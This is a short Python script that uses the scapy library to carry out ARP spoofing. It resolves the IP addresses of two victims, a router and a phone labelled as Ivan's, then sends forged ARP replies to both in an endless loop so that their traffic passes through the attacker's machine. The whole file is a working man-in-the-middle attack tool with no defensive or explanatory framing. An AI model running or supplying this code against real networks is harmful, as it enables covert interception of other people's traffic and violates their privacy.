import time
from scapy.layers.l2 import ARP, Ether, srp, get_if_addr, get_if_hwaddr
from scapy.sendrecv import sendp
from constants import (
    WIFI_INTERFACE,
    IVAN_PHONE_MAC,
    ROUTER_MAC,
    ROUTER_HOME_MAC,
    IVAN_PHONE_HOME_MAC,
)
from utils import get_ip_from_mac, get_my_mac


def get_in_middle(mac_attacker, mac_victim_1, mac_victim_2):
    ip_victim_1 = get_ip_from_mac(mac_victim_1)
    ip_victim_2 = get_ip_from_mac(mac_victim_2)

    print(f"Attacker MAC is {mac_attacker}")
    print("-----------------")
    print(f"Victim1 MAC is {mac_victim_1}")
    print(f"Victim1 IP is {ip_victim_1}")
    print("-----------------")
    print(f"Victim2 MAC is {mac_victim_2}")
    print(f"Victim2 IP is {ip_victim_2}")
    print("   ")
    print("Spoofing...")

    arp1 = Ether() / ARP()
    arp1[Ether].src = mac_attacker
    arp1[ARP].hwsrc = mac_attacker
    arp1[ARP].psrc = ip_victim_2
    arp1[ARP].hwdst = mac_victim_1
    arp1[ARP].pdst = ip_victim_1

    arp2 = Ether() / ARP()
    arp2[Ether].src = mac_attacker
    arp2[ARP].hwsrc = mac_attacker
    arp2[ARP].psrc = ip_victim_1
    arp2[ARP].hwdst = mac_victim_2
    arp2[ARP].pdst = ip_victim_2

    while True:
        sendp(arp1, iface=WIFI_INTERFACE, verbose=False)
        sendp(arp2, iface=WIFI_INTERFACE, verbose=False)
        time.sleep(1)
        print("Spoof packet sent")


if __name__ == "__main__":
    get_in_middle(get_my_mac(), ROUTER_MAC, IVAN_PHONE_MAC)
